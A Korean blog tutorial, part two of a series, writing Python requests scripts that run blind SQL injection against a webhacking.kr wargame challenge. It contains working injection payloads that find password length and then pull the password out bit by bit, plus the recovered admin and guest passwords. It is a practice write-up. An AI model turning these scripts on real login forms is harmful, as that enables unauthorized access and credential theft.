---
title: "Python requests를 이용한 blind injecthion 스크립트 제작 (2편)"
date: 2019-10-23 23:44:31
tags:
  [
    "Python",
    "requests",
    "blind injection",
    "sqi",
    "파이썬 스크립트",
    "blind injection script",
  ]
draft: false
---

시작 하기에 앞서 [이전 포스트 1편](/python/Python-requests를-이용한-blind-injecthion-스크립트-제작-1편/) 을 보고 와주시면 감사하겠습니다.

이전 포스트에서 알아낸 ID을 가지고 password의 길이에 대해 알아내는 스크립트를 작성해봅니다/

```python
import requests

url = 'https://webhacking.kr/challenge/bonus-1/index.php' #url 주소를 입력
cookies = {'PHPSESSID': '사용자의 쿠기 값 입력'} #세션 쿠키를 입력

def find_pw_len(id):
    pw_len = 0
    while 1:
        pw_len=pw_len+1
        value = "' or char_length(pw) = {}  and id='{}' -- '".format(pw_len,id) #반복하면서 pw의 글자수를 비교하는 Payload 코드 작성
        params = {'id': value, 'pw': 'test'} # pw에 Payload 코드 삽입 pw는 아무 문자나 보낸다.
        response = requests.get(url,params=params, cookies=cookies) #GET을 통해 전달
        print(response.status_code) # 응답 코드 확인 200번아니면 오류 상태
        print(value) # 전달되는 Payload 코드 확인
        if "wrong password" in response.text: #응답 값에 wrong password가 있다면 참인 결과 이니 빠져나옴
            break
    return pw_len #pw 길이 반환

if __name__ == '__main__':
    admin_len = find_pw_len("admin")
    guest_len = find_pw_len("guest")
    print("admin의 pw 길이 : "+str(admin_len)+"\nguest의 pw 길이 : "+str(guest_len))
```

위와 같이 간단하게 스크립트를 작성해봅니다.

결과값으로 아래와 같이 나오는데 이 정보를 가지고 다시 작성해봅니다.

```
admin의 pw 길이 : 36
guest의 pw 길이 : 5
```

일단 admin의 pw의 길이가 36자리인데 이때 ascii를 통하여 비교를 하게 되면 최대 36\*94의 횟수를 질의해서 찾아야 하기 때문에 ascii는 7bit+ 패리티 비트 1bit 해서 총 8bit로 이루어져 있다는 사실을 이용하여 8번의 질의만으로 한단어를 파악할 수 잇도록 합니다.

```python
import requests

url = 'https://webhacking.kr/challenge/bonus-1/index.php' #url 주소를 입력
cookies = {'PHPSESSID': '사용자의 쿠기 값 입력'} #세션 쿠키를 입력

def find_pw_len(id):
    pw_len = 0
    while 1:
        pw_len=pw_len+1
        value = "' or char_length(pw) = {}  and id='{}' -- '".format(pw_len,id) #반복하면서 pw의 글자수를 비교하는 Payload 코드 작성
        params = {'id': value, 'pw': 'test'} # pw에 Payload 코드 삽입 pw는 아무 문자나 보낸다.
        response = requests.get(url,params=params, cookies=cookies) #GET을 통해 전달
        print(response.status_code) # 응답 코드 확인 200번아니면 오류 상태
        print(value) # 전달되는 Payload 코드 확인
        if "wrong password" in response.text: #응답 값에 wrong password가 있다면 참인 결과 이니 빠져나옴
            break
    return pw_len #pw 길이 반환

def find_pw_str(id, pw_len):
    pw_str = ""
    for len in range(1,pw_len+1):
        bincar="" #임시 binery 저장장소
        for bit_index in range(1, 9): # 8bit 체크를 위한 반복
            value = "' or id='{}' and substr(lpad(bin(ascii(substr(pw,{},1))),8,0 ),{},1) = 1 -- ' ".format(id,len,bit_index)
            # pw를 len으로 substr한 후 ascii코드로 변환후 2진법으로 변환 그리고 lpad를 이용해서 8bit 채워줌. bit_index를 통해 bit 하나씩 체크
            params = {'id': id ,'pw': value} # id는 매계변수로 넘어온 ID 전달, pw는 Payload 코드 전달
            response = requests.get(url=url, params=params, cookies=cookies) # GET를 통해 요청
            if "wrong password" in response.text:
                bincar += "1" #참인 결과일때에는 1을 추가
            else:
                bincar += "0" #거짓인 결과일때에는 0을 추가
        print("중간비트값:" + bincar) #중간 문자 bit 결과 표시
        pw_str+=chr(int(bincar, 2)) # 2진법에서 정수형으로 바꾼다음 char형으로 변환
        print("현재 패스워드" + pw_str) # 중간 패스워드 상황 표시
    return pw_str # PW 반환

if __name__ == '__main__':
    admin_len = find_pw_len("admin")
    guest_len = find_pw_len("guest")
    print("admin_pw : "+find_pw_str(id="admin",pw_len=admin_len)+"\nguest_pw : "+find_pw_str(id="guest",pw_len=guest_len))

```

결과값

```
admin_pw : there_is_no_rest_for_the_white_angel
guest_pw : guest
```

상당한 시간이 소요 된다는 것을 볼수가 있는데 만약 ASCII 코드로 해서 33~127까지 하나씩 증가 하여 스크립트를 제작하였다면 더 많은 시간이 소요 될 수 있습니다.
